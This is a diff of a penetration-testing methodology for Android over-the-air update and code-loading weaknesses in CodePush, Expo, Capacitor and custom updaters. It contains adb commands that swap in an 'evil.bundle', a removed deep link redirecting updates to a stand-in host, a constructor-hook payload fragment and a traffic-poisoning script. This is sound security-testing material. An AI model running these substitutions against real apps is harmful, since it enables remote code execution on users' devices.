-| **Maps to** | `CodePush.java` (`private static String mPublicKey;`, `getCustomPropertyFromStringsIfExist("PublicKey")`, `getPublicKeyByResourceDescriptor(...)` throwing `CodePushInvalidPublicKeyException("Specified public key is empty")`, default `mServerUrl = "https://codepush.appcenter.ms/"`, `setDeploymentKey()`); `CodePushConstants.java` (`BUNDLE_JWT_FILE = ".codepushrelease"`, `STATUS_FILE = "codepush.json"`, `CODE_PUSH_PENDING_UPDATE`, `LATEST_ROLLBACK_INFO_KEY`); CodePush README (`CheckFrequency.ON_APP_START` default, automatic rollback keeps the previous update) |
+| **Requires** | react-native, device |
+| **Maps to** | `CodePush.java` (`private static String mPublicKey;`, `getCustomPropertyFromStringsIfExist("PublicKey")`, `getPublicKeyByResourceDescriptor(...)` throwing `CodePushInvalidPublicKeyException("Specified public key is empty")`, the hosted App Center service behind the old default `mServerUrl` was retired on 2025-03-31 — a live deployment names a standalone `code-push-server` or community fork in `CodePushServerUrl`, and the client still honours `CodePushPublicKey`, `setDeploymentKey()`); `CodePushConstants.java` (`BUNDLE_JWT_FILE = ".codepushrelease"`, `STATUS_FILE = "codepush.json"`, `CODE_PUSH_PENDING_UPDATE`, `LATEST_ROLLBACK_INFO_KEY`); CodePush README (`CheckFrequency.ON_APP_START` default, automatic rollback keeps the previous update) |
 
-- **Test:** CodePush verifies the downloaded bundle only when a public key is configured (`mPublicKey`,
-  checked against the `.codepushrelease` JWT beside the package). With no public key the runtime accepts
-  whatever the server — or anyone who can impersonate it, or anyone who obtains the deployment key — sends.
-- **How:**
-  ```bash
-  grep -n 'CodePushPublicKey' out/res/values/strings.xml || echo "NO PUBLIC KEY -> unsigned OTA"
-  grep -n 'CodePushServerUrl'  out/res/values/strings.xml     # non-default server?
-  grep -n 'CodePushDeploymentKey' out/res/values/strings.xml
-  adb shell "run-as com.target.app cat files/CodePush/codepush.json"
-  adb shell "run-as com.target.app find files/CodePush -name '.codepushrelease'"   # present => signed release
-  adb shell "run-as com.target.app find files/CodePush -name 'index.android.bundle' -exec ls -l {} \;"
-  ```
-- **Proof:** No `CodePushPublicKey` string resource, no `.codepushrelease` JWT next to the downloaded
-  bundle, and an intercepted/redirected update response resulting in your JS executing after `restartApp`.
-- **Escalation:** Remote code execution in the app's UID for every device on the deployment.
-- **Ruled out when:** `CodePushPublicKey` is present **and** a tampered bundle is rejected at runtime
-  (capture the `CodePushInvalidUpdateException`/rollback in logcat). Config presence alone is not enough.
+- **Test:** Pointer — D19-027 owns this test (title-for-title duplicate; the framework chapter keeps the
+  mechanism). Run it there, record the verdict there, and mirror the row here as `ruled-out: see D19-027 note` or
+  `finding: F-0NN via D19-027`. The D17-specific addition is the execution proof of D17-017 (your code running
+  under the victim's UID after the substitution) and the marker discipline of D17-080.
+- **How:** see D19-027; the substitution proof follows D17-017.
+- **Proof:** as D19-027, plus the D17-017 execution artefact.
+- **Escalation:** as D19-027; → D17-079 for the chain-filing order.
+- **Ruled out when:** D19-027 is ruled out with its enforcement test demonstrated (a tampered manifest or bundle
+  rejected at runtime — config presence alone is not enough); mirror its note verbatim here.
 
 ### D17-028 · The CodePush deployment key is shipped in the APK
 
@@ -1113,15 +1196,19 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the key permits pushing to the deployment; `…for_internal_asset` (P3) if it is read-only enumeration |
 | **Attacker** | AM-03 / AM-09 |
 | **Applies to** | React Native + CodePush |
+| **Requires** | react-native, device |
 | **Maps to** | CodePush docs ("this key will override the 'default' one that was provided in your app's … files"); `CodePush.java` `setDeploymentKey()`; the corpus's D18 secret-sweep discipline |
 
-- **Test:** The deployment key is a string resource in the APK. Establish what that key actually authorises
-  on the service: enumeration of releases, or publication. **Do not assume** — test the read path only, and
-  state clearly which capability you demonstrated.
+- **Test:** The deployment key is a string resource in the APK. The hosted App Center management API no longer
+  exists (retired 2025-03-31): resolve the server from `CodePushServerUrl`, confirm it is in scope, and test the
+  deployment key only against that server's `/updateCheck`-style read path. Establish what the key actually
+  authorises there: enumeration of releases, or publication. **Do not assume** — test the read path only, and
+  state clearly which capability you demonstrated. No `CodePushServerUrl` beside a deployment key means the
+  channel is dead — record that, not a probe of the retired host.
 - **How:**
   ```bash
   unzip -p target.apk res/values/strings.xml 2>/dev/null | strings | grep -i codepush
-  grep -rn 'CodePushDeploymentKey' out/res/values/strings.xml
+  grep -rn 'CodePushDeploymentKey' $DEC/apktool/res/values/strings.xml
   # also mine older releases: a key removed in build N may still be live server-side
   # (pull prior versions from the vendor's published version history and re-run the grep)
   ```
@@ -1140,30 +1227,18 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-02 (one click on a link) |
 | **Applies to** | React Native with CodePush / expo-updates; any custom updater exposing a configurable endpoint |
+| **Requires** | react-native, device |
 | **Maps to** | `CodePush.java` (`public void setDeploymentKey(String deploymentKey)`; constructors taking `serverUrl`); expo `UpdatesConfiguration.kt` `UpdatesController.overrideConfiguration()` with keys `updateUrl`, `requestHeaders`, `runtimeVersion`, `checkOnLaunch`, `codeSigningCertificate` |
 
-- **Test:** Both OTA runtimes let the update source be changed at runtime. If any of that is reachable from
-  a deep link parameter, a WebView bridge message, or an exported component's extra, the **attacker** chooses
-  where the app's code comes from — and, in expo's case, can override `codeSigningCertificate` too.
-- **How:**
-  ```bash
-  grep -rn 'UpdatesController.overrideConfiguration\|setDeploymentKey\|setServerUrl' out/sources/
-  strings -a out/assets/index.android.bundle | grep -aniE 'deploymentKey|serverUrl|overrideConfiguration|updateUrl'
-  # trace the value backwards to a deep link / bridge / extra
-  grep -rnE 'getQueryParameter|getStringExtra|@ReactMethod|addJavascriptInterface' -A6 out/sources/ \
-    | grep -iE 'deployment|update|server|url|channel'
-  ```
-  Then drive it:
-  ```bash
-  adb shell am start -a android.intent.action.VIEW \
-    -d 'targetapp://config?updateUrl=https://poc.example.invalid/manifest'
-  ```
-- **Proof:** An end-to-end demonstration: the deep link is delivered, the app's next update check hits your
-  host (proxy log), and your bundle executes.
-- **Escalation:** Terminal — remote, one-click, code-source takeover. Chains from D09 (deep links) and D10
-  (bridge).
-- **Ruled out when:** The override APIs are absent from the app's code and bundle, or every call site takes
-  a compile-time constant — trace each argument to its literal.
+- **Test:** Pointer — D19-028 owns this test (title-for-title duplicate; the framework chapter keeps the
+  mechanism). Run it there, record the verdict there, and mirror the row here as `ruled-out: see D19-028 note` or
+  `finding: F-0NN via D19-028`. The D17-specific addition is the execution proof of D17-017 (your code running
+  under the victim's UID after the substitution) and the marker discipline of D17-080.
+- **How:** see D19-028; the substitution proof follows D17-017.
+- **Proof:** as D19-028, plus the D17-017 execution artefact.
+- **Escalation:** as D19-028; → D17-079 for the chain-filing order.
+- **Ruled out when:** D19-028 is ruled out with its enforcement test demonstrated (a tampered manifest or bundle
+  rejected at runtime — config presence alone is not enough); mirror its note verbatim here.
 
 ### D17-030 · OTA rollback / downgrade as a security-control bypass
 
@@ -1176,25 +1251,15 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **Requires** | react-native, device |
 | **Maps to** | `CodePushConstants.java` (`PREVIOUS_PACKAGE_KEY`, `CURRENT_PACKAGE_KEY`, `FAILED_UPDATES_KEY`, `LATEST_ROLLBACK_INFO_KEY`, `LATEST_ROLLBACK_PACKAGE_HASH_KEY`, `LATEST_ROLLBACK_COUNT_KEY`); CodePush README (automatic rollback keeps a copy of the previous update); expo `UpdatesConfiguration.kt` `DISABLE_ANTI_BRICKING_MEASURES` |
 
-- **Test:** CodePush keeps the previous package and rolls back on failure; expo has anti-bricking measures
-  that can be disabled. Check whether an attacker — or simply a stale device — can be pinned to a
-  known-vulnerable bundle that the client believes is retired.
-- **How:**
-  ```bash
-  adb shell "run-as com.target.app cat files/CodePush/codepush.json"        # currentPackage / previousPackage
-  adb shell "run-as com.target.app cat shared_prefs/CodePush.xml"           # failed updates, rollback info
-  grep -n 'DISABLE_ANTI_BRICKING_MEASURES' out/AndroidManifest.xml
-  # force the rollback: corrupt the current bundle so the update is marked failed, then relaunch
-  adb shell "run-as com.target.app sh -c 'printf x >> files/CodePush/<hash>/<app>/index.android.bundle'"
-  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
-  ```
-- **Proof:** `codepush.json` showing the app reverted to `previousPackage`, plus the old vulnerable
-  behaviour returning — demonstrate the reinstated defect, not just the version number.
-- **Escalation:** → whichever control the older bundle lacks (a pinning fix, an auth check, a validation
-  routine). This is also the answer to "we already fixed that in an OTA".
-- **Ruled out when:** Corrupting the current bundle produces a hard failure (the app refuses to start or
-  fetches a fresh copy) rather than a silent revert, and `codepush.json` shows no `previousPackage`
-  retained.
+- **Test:** Pointer — D19-029 owns this test (title-for-title duplicate; the framework chapter keeps the
+  mechanism). Run it there, record the verdict there, and mirror the row here as `ruled-out: see D19-029 note` or
+  `finding: F-0NN via D19-029`. The D17-specific addition is the execution proof of D17-017 (your code running
+  under the victim's UID after the substitution) and the marker discipline of D17-080.
+- **How:** see D19-029; the substitution proof follows D17-017.
+- **Proof:** as D19-029, plus the D17-017 execution artefact.
+- **Escalation:** as D19-029; → D17-079 for the chain-filing order.
+- **Ruled out when:** D19-029 is ruled out with its enforcement test demonstrated (a tampered manifest or bundle
+  rejected at runtime — config presence alone is not enough); mirror its note verbatim here.
 
 ### D17-031 · Custom updater — forge the metadata and deliver your own plugin
 
@@ -1204,6 +1269,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-06 (with the app's own TLS weakness) / AM-09 |
 | **Applies to** | any app with a bespoke update or plugin channel — enterprise, IoT, automotive head units, "diagnostics" apps |
+| **Requires** | device |
 | **Maps to** | HackTricks *insecure-in-app-update-rce* (Xtool AnyScan v4.40.11 → 4.40.40, NowSecure research) |
 
 - **Test:** With a trust-all `TrustManager`, a cleartext payload download, or any MitM position, plus a
@@ -1211,7 +1277,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   usually XML or JSON wrapped in a homegrown DES/AES/RC4 + Base64 scheme whose key is in the APK.
 - **How:**
   1. Confirm the insecure TLS path (D14) or the cleartext payload download.
-  2. Recover the metadata crypto — algorithm, mode, hardcoded key and IV — and reimplement it (D12).
+  2. Recover the metadata crypto — algorithm, mode, hardcoded key and IV — and reimplement it (D12). If the
+     payload hash arrives through a *separate* channel (remote config, flag service, signed manifest) rather
+     than in the task object, it is authenticated exactly as strongly as that channel: establish that channel's
+     own signing and pinning first (D17-032, position (b)).
   3. Build a payload whose loader-time hook fires immediately:
      ```c
      __attribute__((constructor)) void init(void){
@@ -1250,9 +1319,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | **Critical** (the verification is the only control between MitM and RCE) |
-| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) → `server_side_injection.remote_code_execution_rce` (P1) once exploited |
+| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) → `server_side_injection.remote_code_execution_rce` (P1) once exploited |
 | **Attacker** | AM-06 / AM-09 |
 | **Applies to** | all custom updaters |
+| **Requires** | device |
 | **Maps to** | HackTricks *insecure-in-app-update-rce* ("Bypassing signature/hash checks (when present)"); MASWE-0011 |
 
 - **Test:** If the updater does verify, determine whether the check is cryptographically bound to the
@@ -1260,10 +1330,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   one file's hash instead of the whole archive; not binding the signature to a developer key; accepting any
   key shipped **next to** the payload; verifying the metadata but not the extracted file tree. An MD5/SHA
   delivered in the *same attacker-controlled task object* as the payload URL detects corruption; it
-  authenticates nothing.
+  authenticates nothing. Three hash positions, three verdicts: (a) hash beside the payload URL in the same
+  response — authenticates nothing; (b) hash delivered by a **separate** channel (remote config, flag service,
+  signed manifest; managed file-download libraries fed by a config system are this shape) — authenticated
+  exactly as strongly as that channel is: establish whether the config response is signed or merely TLS, and
+  whether the app pins that host (D14); (c) signature against a key compiled into the APK — bound.
 - **How:**
   ```bash
-  grep -rnE 'Signature\.getInstance|Signature\.verify|MessageDigest|KeyFactory|X509EncodedKeySpec|PublicKey|Arrays\.equals|MessageDigest\.isEqual' -B8 -A8 out/sources/ \
+  grep -rnE 'Signature\.getInstance|Signature\.verify|MessageDigest|KeyFactory|X509EncodedKeySpec|PublicKey|Arrays\.equals|MessageDigest\.isEqual' -B8 -A8 $DEC/jadx/sources/ \
     | grep -iE 'update|bundle|patch|plugin|module'
   ```
   Then test whether the check is load-bearing at all:
@@ -1281,7 +1355,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   not by itself a finding (that is AM-12); a check whose key travels with the payload is.
 - **Escalation:** → D17-031 without needing the hook at all.
 - **Ruled out when:** The public key is compiled into the APK (or pinned in the Keystore), the signature
-  covers the whole archive, verification runs before extraction, and the failure branch aborts. All four.
+  covers the whole archive, verification runs before extraction, and the failure branch aborts. All four. Or
+  the hash arrives through a separately authenticated config channel whose own integrity you verified (name the
+  channel and its control) and the download is refused on mismatch — demonstrate the refusal.
 
 ### D17-033 · Cordova / Capacitor live-update and `setServerBasePath`
 
@@ -1291,7 +1367,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 (writable staging dir) / AM-09 |
 | **Applies to** | Cordova, Ionic and Capacitor apps with a live-update plugin |
-| **Requires** | cordova, capacitor, device |
+| **Requires** | device |
 | **Maps to** | Capacitor `Bridge.java` (`localServer.hostAssets(DEFAULT_WEB_ASSET_DIR)` with `DEFAULT_WEB_ASSET_DIR = "public"`, and the configurable `getServerBasePath` plumbing) |
 
 - **Test:** The web-stack frameworks have the same problem in a different shape: a plugin downloads a new
@@ -1300,8 +1376,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   grep -rniE 'hot.?code.?push|live.?update|deploy|appflow|ionic-deploy|updateUrl|channel' \
-    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
-  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' out/sources/ | head
+    $DEC/apktool/res/xml/config.xml $DEC/apktool/assets/capacitor.config.json $DEC/apktool/assets/www/cordova_plugins.js 2>/dev/null
+  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' $DEC/jadx/sources/ | head
   adb shell "run-as com.target.app ls -laR files/ | grep -iE 'ionic|dist|snapshot|www|public'"
   ```
   Then substitute the staged `index.html` and restart.
@@ -1322,7 +1398,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 / AM-09 |
 | **Applies to** | all RN / Expo / Cordova / Flutter-with-dynamic-assets apps, regardless of Android version |
-| **Requires** | react-native, cordova, capacitor, flutter, device |
+| **Requires** | device |
 | **Maps to** | `about/versions/14/behavior-changes-14` — the read-only mandate applies to **DEX, JAR, APK**, i.e. not to JS or Dart bundles; `risks/dynamic-code-loading` (MASVS-CODE) |
 
 - **Test:** Teams routinely believe Android 14 secured their OTA. It did not: the mandate covers DEX/JAR/APK
@@ -1332,9 +1408,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   ```bash
   unzip -l target.apk | grep -iE 'index.android.bundle|app.bundle|libapp.so|assets/flutter_assets|\.hbc'
   adb shell run-as com.target.app find . -name '*.bundle' -o -name '*.hbc' 2>/dev/null
-  grep -rnE 'CodePush|expo-updates|EXUpdates|publicKey|codeSigningCertificate' out/sources/
+  grep -rnE 'CodePush|expo-updates|EXUpdates|publicKey|codeSigningCertificate' $DEC/jadx/sources/
   # substitute locally, no network needed
-  adb shell run-as com.target.app cp /sdcard/Download/evil.bundle files/updates/<id>/app.bundle
+  adb shell run-as com.target.app cp /sdcard/Download/evil.bundle files/updates/<id>/app.bundle   # load-site confirmation ONLY; pair with D17-009's write primitive for the finding
   adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
   ```
 - **Proof:** Modified JS executing — an injected `console.log('PWNMARK7f3a91')` in logcat, or a visible UI
@@ -1352,7 +1428,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the install primitive; rate the installed package's own privilege precisely |
 | **Attacker** | AM-09 |
 | **Applies to** | OEM/vendor updaters, IoT and automotive head units, enterprise installers, MDM agents |
-| **Requires** | oem-scope, enterprise, device |
+| **Requires** | device |
 | **Maps to** | HackTricks *insecure-in-app-update-rce* ("Trusted updater abuse: installing packages that do not exist yet"), citing the MoYu Android head-unit research and Android's `pm` documentation |
 
 - **Test:** Do not test only *replacement* updates. A preinstalled or privileged updater may deserialise a
@@ -1384,7 +1460,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-09 / AM-08 |
 | **Applies to** | any app with a server-driven plugin architecture; malware triage |
-| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Configuration-driven reflective modules") |
+| **Requires** | device |
+| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Configuration-driven reflective modules"); Snyk SourMint detection guidance ("Identify excessive `Class.forName()`, `getMethod()`, and `invoke()` patterns indicating hidden functionality") |
 
 - **Test:** Look beyond hardcoded command handlers. A compact implant receives integer task IDs, fetches
   JSON descriptors only for unknown or newer timestamped versions, persists them in `SharedPreferences`, and
@@ -1394,10 +1471,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   adb shell run-as com.target.app cat shared_prefs/*.xml
-  grep -rnE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|newInstance\(\)|getDeclaredConstructor' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|kotlin)/'
+  # rank packages by reflective density first and read the top third-party offenders (ad / attribution / security SDKs)
+  grep -rncE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|\.invoke\(' $DEC/jadx/sources/ | sort -t: -k2 -rn | head -20
+  grep -rnE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|newInstance\(\)|getDeclaredConstructor' $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|kotlin|kotlinx)/'
   # correlate: does a config fetch supply the reflected names?
-  grep -rn 'OkHttpClient\|HttpURLConnection\|Retrofit' out/sources/<dispatcher-package>/
+  grep -rn 'OkHttpClient\|HttpURLConnection\|Retrofit' $DEC/jadx/sources/<dispatcher-package>/
   ```
 - **Proof:** A decompiled dispatcher resolving class and method names from a server response, plus a
   captured config response containing those names — then serve a modified descriptor through your proxy and
@@ -1414,9 +1493,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | rated by the control the flag disables — `broken_authentication_and_session_management.authentication_bypass` (P1) where it gates auth; `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) otherwise |
+| **VRT** | rated by the control the flag disables — `broken_authentication_and_session_management.authentication_bypass` (P1) where it gates auth; `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) otherwise |
 | **Attacker** | AM-09 (console or backend compromise) / AM-06 where TLS is the only control |
 | **Applies to** | all apps with a remote-config SDK |
+| **Requires** | — |
 | **Maps to** | Firebase Remote Config / LaunchDarkly / Optimizely / ConfigCat client APIs; the corpus's restore-side item on flags surviving backup restore |
 
 - **Test:** A flag delivered over TLS but with no signature that disables pinning, lowers an auth
@@ -1425,7 +1505,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   direction, not only the restore direction.
 - **How:**
   ```bash
-  grep -rnE 'FirebaseRemoteConfig|getBoolean\(|getString\(|LDClient|featureFlag|Optimizely|ConfigCat' -A6 out/sources/ \
+  grep -rnE 'FirebaseRemoteConfig|getBoolean\(|getString\(|LDClient|featureFlag|Optimizely|ConfigCat' -A6 $DEC/jadx/sources/ \
     | grep -iE 'pin|ssl|cert|debug|auth|bypass|skip|host|endpoint|jailbreak|root|integrity'
   unzip -p target.apk res/xml/remote_config_defaults.xml 2>/dev/null | head -50
   ```
@@ -1445,29 +1525,23 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with a demonstrated new method invoked; otherwise frame it as "the vendor can change this app's behaviour post-review" |
 | **Attacker** | AM-08 / AM-09 |
 | **Applies to** | all; ad and attribution SDKs first |
+| **Requires** | device |
 | **Maps to** | Snyk SourMint detection guidance ("Identify excessive `Class.forName()`, `getMethod()`, and `invoke()` patterns indicating hidden functionality") |
 
-- **Test:** Heavy `Class.forName`/`getMethod`/`invoke` inside an SDK usually means either string-obfuscated
-  functionality or a command dispatcher driven by remote config. Rank the packages by density and read the
-  top offenders.
-- **How:**
-  ```bash
-  grep -rncE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|\.invoke\(' out/sources/ | sort -t: -k2 -rn | head -20
-  grep -rn 'OkHttpClient\|HttpURLConnection\|Retrofit' out/sources/<topOffenderPkg>/
-  ```
-- **Proof:** A decompiled dispatcher resolving class + method names from a server response, plus the
-  captured config response containing those names. Then demonstrate it by serving a modified config through
-  the proxy and observing a new method invoked.
-- **Escalation:** → D17-036; → D20 privacy if the activated capability collects data.
-- **Ruled out when:** The reflective density is explained by a legitimate pattern you can name (a
-  serialization library, a version-compat shim) and no reflected name is derived from network input.
+- **Test:** Superseded by D17-036 — the reflective-density ranking is now its first sub-step. Run it there,
+  record the result there, and mirror the row id here (`ruled-out: see D17-036 note`).
+- **How:** see D17-036.
+- **Proof:** as D17-036.
+- **Escalation:** as D17-036; → D20 privacy if the activated capability collects data.
+- **Ruled out when:** D17-036 is ruled out: the reflective density is explained by a legitimate pattern you can
+  name (a serialization library, a version-compat shim) and no reflected name is derived from network input.
 
 ### D17-039 · SDK behaviour that only activates when you are not looking
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES); Critical framing if the SDK loads remote code (then it is D17-025/036) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); Critical framing if the SDK loads remote code (then it is D17-025/036) |
 | **Attacker** | AM-08 |
 | **Applies to** | all; ad, attribution and "security" SDKs first |
 | **Requires** | device |
@@ -1478,9 +1552,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   it, so this is a finding about *the app*.
 - **How:**
   ```bash
-  grep -rnE 'isDebuggerConnected|android\.os\.Debug|Build\.FINGERPRINT|ro\.debuggable|ro\.kernel\.qemu|getDefaultProxyHost|getDefaultHost\(\)|System\.getProperty\("http\.proxyHost"\)|VpnService|TRANSPORT_VPN' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx)/'
-  grep -rnE 'registerReceiver|ContentObserver|content://downloads' out/sources/ | grep -viE '^out/sources/(android|androidx)/'
+  grep -rnE 'isDebuggerConnected|android\.os\.Debug|Build\.FINGERPRINT|ro\.debuggable|ro\.kernel\.qemu|getDefaultProxyHost|getDefaultHost\(\)|System\.getProperty\("http\.proxyHost"\)|VpnService|TRANSPORT_VPN' $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|kotlin|kotlinx)/'
+  grep -rnE 'registerReceiver|ContentObserver|content://downloads' $DEC/jadx/sources/ | grep -viE '/(android|androidx|kotlin|kotlinx)/'
   ```
   ```javascript
   Java.perform(function () {
@@ -1511,7 +1585,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **Requires** | backend-api |
 | **Maps to** | the mobile→backend bridge rule: a mobile app's hardcoded backend calls are frequently an **older API version** than the current web app uses, with weaker auth, weaker rate limits, weaker validation and more field exposure |
 
-- **Test:** The OTA manifest endpoint, the remote-config endpoint and the plugin-catalogue endpoint are
+- **Test:** Cross-reference: the shadow-API diff is run once per engagement (D01-068) — cite its result here and
+  keep only the code-loading consequence. The OTA manifest endpoint, the remote-config endpoint and the plugin-catalogue endpoint are
   backend APIs that nobody reviews as backend APIs. They are typically the *oldest* version still live,
   because the fleet of installed apps pins them. Diff them **behaviourally** against the current version for
   the same operation — auth strength, rate limiting, input validation, field exposure — not by response
@@ -1545,13 +1620,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | rate on the defect the stale version retains; the control gap alone is `using_components_with_known_vulnerabilities.outdated_software_version` (P5) |
 | **Attacker** | AM-11 (the user's own device staying stale) / AM-01 against the version check |
 | **Applies to** | Google Play In-App Updates requires Play distribution; otherwise the custom backend-gated pattern applies. MAS-L2 control |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0392 (static), MASTG-TEST-0382 (runtime); MASWE-0043 (CWE-602, CWE-693); MASVS-CODE-2; LEGACY-ID MSTG-ARCH-9 |
 
 - **Test:** Without enforcement a device stays indefinitely on a version with a known, already-fixed
   vulnerability. MASTG-TEST-0382 names four bypasses; run all four.
 - **How:**
   ```bash
-  grep -rnE 'AppUpdateManagerFactory|getAppUpdateInfo|startUpdateFlowForResult|UpdateAvailability|AppUpdateType\.(IMMEDIATE|FLEXIBLE)|DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS|BuildConfig\.VERSION_(NAME|CODE)|getPackageInfo' out/sources/
+  grep -rnE 'AppUpdateManagerFactory|getAppUpdateInfo|startUpdateFlowForResult|UpdateAvailability|AppUpdateType\.(IMMEDIATE|FLEXIBLE)|DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS|BuildConfig\.VERSION_(NAME|CODE)|getPackageInfo' $DEC/jadx/sources/
   ```
   1. Dismiss the update dialog. 2. Cancel an immediate update flow. 3. Background the app before the update
   completes. 4. Manipulate the reported version — intercept the version-check request and rewrite the client
@@ -1584,10 +1660,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   # the fields the app parses
-  grep -rnE 'optString|getString\("|@SerializedName|@Json|Moshi|Gson|kotlinx\.serialization' out/sources/ \
+  grep -rnE 'optString|getString\("|@SerializedName|@Json|Moshi|Gson|kotlinx\.serialization' $DEC/jadx/sources/ \
     | grep -oE '"[a-z_]+"' | sort -u > server_fields.txt
   # the sinks to watch
-  grep -rnE 'loadUrl\(|Intent\.parseUri|startActivity\(|setClassName\(|FileOutputStream\(|openFileOutput|DexClassLoader|PathClassLoader|System\.load|Runtime\.exec|WebView' out/sources/
+  grep -rnE 'loadUrl\(|Intent\.parseUri|startActivity\(|setClassName\(|FileOutputStream\(|openFileOutput|DexClassLoader|PathClassLoader|System\.load|Runtime\.exec|WebView' $DEC/jadx/sources/
   ```
   ```python
   # poison.py — mitmdump -s poison.py ; rewrites every string value once
@@ -1620,6 +1696,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with a gadget executing; `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) if all you have is a crash |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0337 (References to Object Deserialization of Untrusted Data); MASWE-0050 (CWE-502, CWE-20); MASTG-KNOW-0021; `risks/unsafe-deserialization`; MASTG-TEST-0034 (deprecated "Testing Object Persistence"); H1 #2516732 (Basecamp, Medium 6.8, "By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account"); H1 #453791 (PayPal — unsafe deserialization leads to token leakage) |
 
 - **Test:** `getSerializableExtra` / `ObjectInputStream` / `readObject` reachable from an **exported**
@@ -1630,14 +1707,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   manipulation, a `readObject` side effect, a self-populated credential object) but is a different claim.
 - **How:**
   ```bash
-  grep -rnE 'ObjectInputStream|readObject\(|readUnshared|getSerializableExtra|readSerializable' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx)/'
-  grep -rn 'implements Serializable' out/sources/ | wc -l
-  grep -rn -A10 'private void readObject' out/sources/       # gadget candidates inside the app itself
+  grep -rnE 'ObjectInputStream|readObject\(|readUnshared|getSerializableExtra|readSerializable' $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|kotlin|kotlinx)/'
+  grep -rn 'implements Serializable' $DEC/jadx/sources/ | wc -l
+  grep -rn -A10 'private void readObject' $DEC/jadx/sources/       # gadget candidates inside the app itself
   # gadget-bearing dependencies?
   unzip -l target.apk | grep -iE 'commons-collections|commons-beanutils|groovy|spring|snakeyaml|jodd|c3p0'
   # export status FIRST
-  grep -n -B2 -A6 'android:exported="true"' out/AndroidManifest.xml
+  grep -n -B2 -A6 'android:exported="true"' $DEC/apktool/AndroidManifest.xml
   ```
   Deliver arbitrary bytes without writing a PoC app:
   ```
@@ -1674,6 +1751,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | `targetSdk < 33` is where the untyped getters are the default idiom; from API 33 the typed overloads exist and their **absence** at a hit is the finding |
+| **Requires** | device |
 | **Maps to** | Hacktive Security, *"Android Deserialization Deep Dive"* (2025-03-13) — the `getSerializableExtra()` → `Bundle` → `ObjectInputStream.readObject()` chain with a ClassLoader spanning app and system paths, and the DEX-extract → reflect → re-serialise workflow; `risks/unsafe-deserialization` |
 
